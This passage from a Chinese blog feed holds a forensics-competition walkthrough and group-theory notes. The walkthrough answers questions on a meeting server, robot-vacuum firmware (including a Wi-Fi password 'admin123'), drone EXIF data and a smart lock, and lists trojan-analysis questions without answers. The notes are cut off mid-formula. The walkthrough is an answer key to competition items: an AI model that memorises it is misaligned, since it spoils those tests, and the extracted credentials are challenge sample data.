src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233458164.png" alt="image-20251107233458164"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233648403.png" alt="image-20251107233648403"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9，3</span><br></pre></td></tr></table></figure><h2 id="question27"><a href="#question27√" class="headerlink" title="question27√"></a>question27√</h2><p>接上题，用户John哪个时间段的会议预约申请次数最多[答案格式:2000-01-01 00:00-00:00]</p><p>这题尝试了好几次</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233731644.png" alt="image-20251107233731644"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-05-<span class="number">15</span> <span class="number">16</span>:<span class="number">00</span>-<span class="number">16</span>:<span class="number">59</span></span><br></pre></td></tr></table></figure><h2 id="question28"><a href="#question28√" class="headerlink" title="question28√"></a>question28√</h2><p>请分析服务器，给出用户Harvey预约了什么时间的会议？[答案格式:2000-01-01 00:00-00:00]</p><p>这题应该<code>Harvey</code>是预约<code>5-17</code>的日期（应该把网站起起来会更好）</p><p> <img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233939662.png" alt="image-20251107233939662"></p><h2 id="question29"><a href="#question29√" class="headerlink" title="question29√"></a>question29√</h2><p>会议管理系统的后台登陆地址是[答案格式:www.baidu.com:8080/login.php]</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000318181.png" alt="image-20251108000318181"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hy.paofen.com:<span class="number">8085</span>/dkewl.php</span><br></pre></td></tr></table></figure><h1 id="物联取证"><a href="#物联取证" class="headerlink" title="物联取证"></a>物联取证</h1><p>直接开始手撕，手撕之前先要使用<code>binwalk</code>看看偏移之类。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106205801721.png" alt="image-20251106205801721"></p><h2 id="question1"><a href="#question1√-4" class="headerlink" title="question1√"></a>question1√</h2><p>分析扫地机器人数据，robot1.bin采用的压缩算法是？[答案格式:xxxx]</p><p>在用<code>binwalk</code>分析<code>robot1.bin</code>的时候就可以知道了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106205831979.png" alt="image-20251106205831979"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LZMA</span><br></pre></td></tr></table></figure><h2 id="question2"><a href="#question2√-3" class="headerlink" title="question2√"></a>question2√</h2><p>扫地机器人使用的软件版本是？[答案格式:0.0.0]</p><p>确定完一些偏移之后，现在就可以直接用<code>winhex</code>打开。然后直接搜索<code>version</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210420160.png" alt="image-20251106210420160"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.1.0</span><br></pre></td></tr></table></figure><h2 id="question3"><a href="#question3√-3" class="headerlink" title="question3√"></a>question3√</h2><p>扫地机器人id是？[答案格式:21243245838790]</p><p>继续硬搜，搜索<code>id</code>字样，继续搜索就会搜索到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210735520.png" alt="image-20251106210735520"></p><h2 id="question4"><a href="#question4√-2" class="headerlink" title="question4√"></a>question4√</h2><p>扫地机器人云证书的前6位是？[答案格式:sdfead]</p><p>继续搜索，我们知道证书的英文是<code>certificate</code>，直接搜索<code>cer</code>即可，一搜就得到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210916303.png" alt="image-20251106210916303"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIIDnj</span><br></pre></td></tr></table></figure><h2 id="question5"><a href="#question5√-3" class="headerlink" title="question5√"></a>question5√</h2><p>扫地机器人连接过的wifi的ssid是(channl1)？[答案格式:xx_xx_xx]</p><p>继续暴力硬搜<code>ssid</code>，一搜就到，然后注意<code>U</code>不能算进去，应该会有考虑到内存对齐之类的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211117258.png" alt="image-20251106211117258"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELPASO_TPLINK_C04A00BD0769</span><br></pre></td></tr></table></figure><h2 id="question6"><a href="#question6√-3" class="headerlink" title="question6√"></a>question6√</h2><p>扫地机器人连接过的wifi的密码是(channl1)？[答案格式:xxxx]</p><p>就是在<code>ssid</code>下面就是，要注意从哪里到哪里（这个是坑点）</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211247772.png" alt="image-20251106211247772"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin123</span><br></pre></td></tr></table></figure><h2 id="question7"><a href="#question7√-3" class="headerlink" title="question7√"></a>question7√</h2><p>扫地机器人的时区是？[答案格式:xx/xx]</p><p>一开始我是直接搜索关键词<code>utc</code>，发现没有符合答案格式的结果，后来就直接搜索关键字<code>time</code>，出现了结果</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211723325.png" alt="image-20251106211723325"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">America/Denver</span><br></pre></td></tr></table></figure><h2 id="question8"><a href="#question8√-3" class="headerlink" title="question8√"></a>question8√</h2><p>扫地机器人的名称是？[答案格式:xxxxx]</p><p>继续暴力搜索，使用关键字搜索<code>name</code>，从前面这么多题就会发现该<code>bin</code>文件的字符串一般都是以<code>U</code>结尾的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211834948.png" alt="image-20251106211834948"></p><h2 id="question9"><a href="#question9√-2" class="headerlink" title="question9√"></a>question9√</h2><p>无人机飞行纬度前两位是？[答案格式:xx]</p><p>接下来就是无人机的了，直接<code>binwalk</code>继续确定偏移，发现无人机不是给的固件，而是给两张图片，直接查看图片的<code>exif</code>信息</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213232162.png" alt="image-20251106213232162"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31</span><br></pre></td></tr></table></figure><h2 id="question10"><a href="#question10√-3" class="headerlink" title="question10√"></a>question10√</h2><p>无人机的快门速度是？[答案格式:x/xxx]</p><p>该单位应该是秒，一开始我还以为<code>/</code>后面是单位，结果是速度用分数表示，还是继续看<code>exif</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213828431.png" alt="image-20251106213828431"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>/<span class="number">400</span></span><br></pre></td></tr></table></figure><h2 id="question11"><a href="#question11√-3" class="headerlink" title="question11√"></a>question11√</h2><p>分析智能门锁数据包，请给出用户“wonderful”首次开门时间？[答案格式:2000-01-01 00:00-00:00]</p><p>接下来分析智能门锁文件，发现该压缩包给的是<code>caseinfo.json</code>文件，以及一些文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213936191.png" alt="image-20251106213936191"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106214015331.png" alt="image-20251106214015331"></p><p>直接使用<code>vscode</code>打开该文件夹，然后暴力搜索即可，发现没有，后来直接找到了这个数据库</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215735705.png" alt="image-20251106215735705"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215744489.png" alt="image-20251106215744489"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-02-<span class="number">17</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">38</span></span><br></pre></td></tr></table></figure><h2 id="question12"><a href="#question12√-3" class="headerlink" title="question12√"></a>question12√</h2><p>分析智能门锁数据包，请给出智能门锁MAC地址？[答案格式：字母大写]</p><p>继续暴力搜索<code>mac</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215148487.png" alt="image-20251106215148487"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E8:BD:63:D0:6F:AD</span><br></pre></td></tr></table></figure><h1 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h1><p>首先这个二进制程序是在黑客电脑中的，对应的一个就是前面流量分析中<code>setup.exe</code>相当于木马软件，第二个就是<code>控制端.exe</code>这个程序。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106231259229.png" alt="image-20251106231259229"></p><ul><li>在问题中有明确给出这两个程序的称呼，一个是<code>木马程序也就是setup.exe</code>、另一个是<code>控制程序也就是控制端.exe</code>。（一开始我还以为是<code>GHOST2011.exe</code>）是控制端程序，感觉这个像是代理。</li><li>而前五题专门是分析控制程序的，而后五题专门是分析木马程序的。前五题考<code>python逆向</code>、后五题考<code>exe</code>逆向。</li></ul><h2 id="question1"><a href="#question1" class="headerlink" title="question1"></a>question1</h2><p>分析黑客电脑，控制端程序传输协议是什么协议？[答案格式:http]</p><h2 id="question2"><a href="#question2-1" class="headerlink" title="question2"></a>question2</h2><p>分析黑客电脑，控制端程序接收数据缓冲区大小是多少？[答案格式:100]</p><h2 id="question3"><a href="#question3-1" class="headerlink" title="question3"></a>question3</h2><p>分析黑客电脑，控制端程序接收并判断几种指令？[答案格式:1]</p><h2 id="question4"><a href="#question4-2" class="headerlink" title="question4"></a>question4</h2><p>分析黑客电脑，控制端程序连接结束指令是什么？[答案格式:xxx]</p><h2 id="question5"><a href="#question5-1" class="headerlink" title="question5"></a>question5</h2><p>分析黑客电脑，控制端程序配置文件解密函数是什么?[答案格式:x_x]</p><h2 id="question6"><a href="#question6" class="headerlink" title="question6"></a>question6</h2><p>分析黑客的木马程序，该程序控制端ip是？[答案格式:127.0.0.1]</p><h2 id="question7"><a href="#question7" class="headerlink" title="question7"></a>question7</h2><p>分析黑客的木马程序，程序在地址0x00410CA4处调用了Sleep函数，请问该函数会暂停几秒？[答案格式:3]</p><h2 id="question8"><a href="#question8" class="headerlink" title="question8"></a>question8</h2><p>分析黑客的木马程序，该程序“png”型资源下有两张图片，程序图标对应图片的MD5值是？[答案格式:字母小写]</p><h2 id="question9"><a href="#question9-1" class="headerlink" title="question9"></a>question9</h2><p>分析黑客的木马程序，哪个函数直接调用了HOST型资源？[答案格式:sub_1234]</p><h2 id="question10"><a href="#question10" class="headerlink" title="question10"></a>question10</h2><p>分析黑客的木马程序，该程序会绕过哪个杀毒软件？[答案格式:腾讯]</p>]]></content>
    
    
    <summary type="html">前言：跑去打美亚了，最近突突一下取证和期末。pgs题目质量没的说。</summary>
    
    
    
    <category term="取证" scheme="http://iyheart.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>群论</title>
    <link href="http://iyheart.github.io/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/"/>
    <id>http://iyheart.github.io/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/</id>
    <published>2025-10-17T06:18:42.000Z</published>
    <updated>2025-10-19T11:50:47.250Z</updated>
    
    <content type="html"><![CDATA[<ul><li>群、环、域，这三个都是近世代数的一些概念，而近世代数也被称为抽象代数。</li><li>近世代数所研究的对象是代数系。对于整数加法运算，整数乘法运算、矩阵运算等，都是在研究某一特定集合的特定运算。</li><li>而近世代数，就是将这些原本抽象的运算，再进一步的抽象出来，探究他们共同的运算性质和规律。<ul><li>整数加法：满足加法结合律、有逆元、有单位元。</li><li>矩阵运算：特定集合下满足矩阵乘法、有单位矩阵、有逆矩阵</li><li>近世代数将这些进行进一步抽象，得到了群、环、域（虽然矩阵乘法是半群）</li></ul></li><li>接下来就来介绍一下群</li></ul><h1 id="群的定义"><a href="#群的定义" class="headerlink" title="群的定义"></a>群的定义</h1><blockquote><p><strong>定义1</strong>：排列（也被称为置换<code>permutation</code>）</p><p>给定集合$X$，$X$到$X$自身的一个双射称为一个排列。</p><p>给定集合$X$到$X$自身全体排列的集合记作$S_n$。</p><p>注解：置换本质上是一个函数，一般使用$\pi、\sigma$</p><p><strong>定义2</strong>：群的定义</p><p>一个群是一个三元组$(G,\circ,e)$，其中$G$ 是一个集合。</p><ul><li>对于$\circ$：$G×G\rightarrow G$，是一个二元运算（这个运算中隐含了封闭性）</li><li>对于$e\in G$：是一个特殊元素称作单位。</li><li>满足如下运算（公理），则$(G,\circ,e)$就被称为一个群：<ul><li>（单位）$\forall a \in G$，$ae=ea=a$</li><li>（逆元）$\forall a\in G,\exists a^{-1}\in G，a^{-1}a=aa^{-1}=e$</li><li>（结合）$(a·b)·c=a·(b·c)$</li></ul></li></ul><p>注解1：群是一个<code>结构</code>，这个<code>结构=集合+运算+公理</code></p><p>注解2：群的公理可修改（增加、减少、改变条件）</p><p>注解3：群存在<strong>变体</strong>，比如数据只有$(G,\circ)$，然后再加上群定义中的结合公理，则称$G$是一个半群。</p><p>注解4：再介绍一个群的<strong>变体</strong>，有一个三元组$(G,\circ,e)$，它没有逆元公理，此时该群称为<strong>幺半群(Monoid)</strong></p><p>注解5：前面的变体都是减少条件，而<strong>阿贝尔群</strong>(Abel)则是增加条件，增加了一个公理<strong>交换律</strong>，即$\forall a,b,~~~ a·b=b·a$，</p><p><strong>例子1</strong>：</p><p>对于三元组$(\Z,+,0)$，即整数集合上的加法运算，单位元是<code>0</code>。该三元组是一个<strong>阿贝尔群</strong></p><p><strong>例子2</strong>：</p><p>对于三元组$(\Z/m,+,0)$，即整数集合上模<code>m</code>的加法运算，单位元是<code>0</code>，该三元组也是一个<strong>阿贝尔群</strong></p><p><strong>例子3</strong>：</p><p>对于三元组$(\R,+,0)$、$(\Q,+,0)$、$(\C,+,0)$，即在实数、有理数、复数上的加法运算，也构成<strong>阿贝尔群</strong>。</p><p><strong>例子4</strong>：</p><p>对于三元组$(\C^{×},×,1)$，这里$C^{×}$指的是乘法可逆元，目前可以理解为$\C-{0}$即一个复数集去掉元素<code>0</code>，也构成<strong>阿贝尔群</strong>。</p><p><strong>例子5</strong>：</p><p>对于三元组$(\R_{&gt;0},×,1)$也构成一个<strong>阿贝尔群</strong></p><p><strong>例子6</strong>：</p><p>存在许多非<strong>阿贝尔群</strong>，$(S<em>n,\circ,e)$，$e=Id</em>{X_n}$，也就是定集合$X$到$X$自身全体排列的集合，当$n≥3$时就不是阿贝尔群。</p><p><strong>例子7</strong>：</p><p>对于三元组$(GL_n(F),\circ,I_n)$，也就是<strong>在数域F</strong>中$n×n,n≥2$的可逆矩阵，满足某个代数运算，单位元为$I_n$，该三元组构成一个<strong>非阿贝尔群</strong>。数域F如何定义，这里不多说，可以看看丘维声高代的第一章。</p><p>简单给一下$GL_n(F)$的定义，$M_n(F)$表示所有$n×n$的矩阵，元素来自域$F$：</p><script type="math/tex; mode=display">GL_n(F)=\{A∈M_n(F)∣det(A)≠0\}</script></blockquote><h1 id="群的定义"><a href="#群的定义-1" class="headerlink" title="群的定义"></a>群的定义</h1><ul><li>群中的最基本的概念就是这些，之后再由这些最基础的，才引申出对称群、四元数群、二面体群等等。</li><li>所以先要来介绍一下最基本的群概念</li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20241126145639144.png" alt="image-20241126145639144"></p><h2 id="群和半群"><a href="#群和半群" class="headerlink" title="群和半群"></a>群和半群</h2><ul><li>群是由一个集合和一个二元运算构成的代数系，它在近世代数中是最基本的一个代数系。</li><li>首先明确一点：群是建立在集合之上的，满足一定运算条件的集合才会被称为群。</li><li>其次再注意：群定义中的乘法运算并不是我们常用的乘法运算，它只是运算的一个代表，了解了群之后我们根据定义可以得到整数加法（运算符为：+）构成一个群，此时乘法符号：（·）就会变成加法符号了。具体再深入理解即可。</li><li>这里先来介绍半群的概念</li></ul><blockquote><p><strong>半群的定义</strong>：</p><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li></ol></blockquote><ul><li>接下来再引出群的概念</li></ul><blockquote><p><strong>群的定义：</strong></p><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li><li><strong>逆元</strong>：对于G中任意元素a都存在G中的一个元素b（左逆元），有<strong>b·a=e</strong></li></ol></blockquote><ul><li>通常群的这种代数结构，我们用<strong>(G,·)</strong>这种形式来表示，G是一个集合，·是一个运算符<ul><li>比如整数加法群：（Z，+）</li><li>去零整数乘法群：（Z/{0}，·）</li></ul></li></ul><h2 id="其他群"><a href="#其他群" class="headerlink" title="其他群"></a>其他群</h2><ul><li><p>群和半群是群中俩个最基本的概念，还有一些群接下来再来说明一下</p></li><li><p>如果半群中存在单位元，则就被称为含幺（yao）半群(monoid)</p></li></ul><blockquote><p><strong>含幺半群的定义</strong>：</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li></ol></blockquote><ul><li>而阿贝尔群则是在群的定义上多出了交换律</li></ul><blockquote><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li><li><strong>逆元</strong>：对于G中任意元素a都存在G中的一个元素b（左逆元），有<strong>b·a=e</strong></li><li><strong>交换律</strong>：对任何a，b∈G有<strong>a·b=b·a</strong></li></ol></blockquote><ul><li>这里也顺带提一下有限群和无限群：<ul><li>有限群：群G如果是有限集，那么就被称为有限群。</li><li>无限群：群G如果是无限集，那么就被称为无限群。</li></ul></li></ul><h2 id="阶段习题1"><a href="#阶段习题1" class="headerlink" title="阶段习题1"></a>阶段习题1</h2><ul><li><p>近世代数这部分还是比较偏抽象，逻辑性高的，所以里面的题目都是证明题为主。而了解了群的定义后基本上就是根据定义去证明某个集合加运算是不是群或者半群。包括接下来学的群的定义也一样是证明群。</p></li><li><p>这里找几题书上的例题和练习证明（学习过程中最好是先看看概念和例题，然后动手写纸上证明，要是不闲麻烦可以将证明再写到博客上，或者直接截图。）</p></li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20241126154726998.png" alt="image-20241126154726998"></p><h1 id="群的性质"><a href="#群的性质" class="headerlink" title="群的性质"></a>群的性质</h1><h2 id="单位元和逆元的性质"><a href="#单位元和逆元的性质" class="headerlink" title="单位元和逆元的性质"></a>单位元和逆元的性质</h2><ul><li>对于单位元，单位元被分为左单位元和右单位元</li></ul><blockquote><p><strong>左、右单位元</strong>：</p><p>设是一个半群（G，·）</p><p><strong>左单位元</strong></p><script type="math/tex; mode=display">若有元素e_L使对任何a∈G有，e_L·a=a，则e_L叫做左单位元</script><p><strong>右单位元</strong></p><script type="math/tex; mode=display">若有元素e_R使对任何a∈G有，e_R·a=a，则e_R叫做右单位元</script></blockquote><h2 id="群的性质"><a href="#群的性质-1" class="headerlink" title="群的性质"></a>群的性质</h2><h1 id="群的同态和同构"><a href="#群的同态和同构" class="headerlink" title="群的同态和同构"></a>群的同态和同构</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="同态与同构"><a href="#同态与同构" class="headerlink" title="同态与同构"></a>同态与同构</h2><ul><li>前置知识基本上就是高数第一章所学的集合和映射。</li><li>接下来就介绍一下同态和同构，同态和同构这俩个概念还是比较抽象的，需要借助俩个例子进行理解。</li></ul><blockquote><p><strong>同态的定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}设代数系统(A,·)和代数系统(B,\odot),\\如果存在映射f,把A中的元素映射到B中，并且对于任意a、b∈A，都有\\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~f(a·b)=f(a)\odot f(b)\\那么这个映射属于同态映射(同态可以理解为同样形态)。\end{array}</script><p><strong>同构的定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}如果同态映射还是一一映射，则称为同构映射。\end{array}</script></blockquote><ul><li>对于单纯看同态和同构的定义，确实比较难以理解，所以这边就举俩个例子。</li><li><strong>例1：对于高中的一类题型抽象函数的题型，函数满足某些性质，考察的就是同态和同构的定义</strong></li></ul><blockquote><p><strong>指数乘法与整数加法运算</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}假设整数集合Z里的运算是加法，Z通过映射\\~~~~~~~~~~~~~~~~~~~~~~~~~~~~f:a→e^a\\产生一个实数集合(这里e是自然常数):\\~~~~~~~~~~~~~~~~~~~~~~~~~~~\{e^a\mid 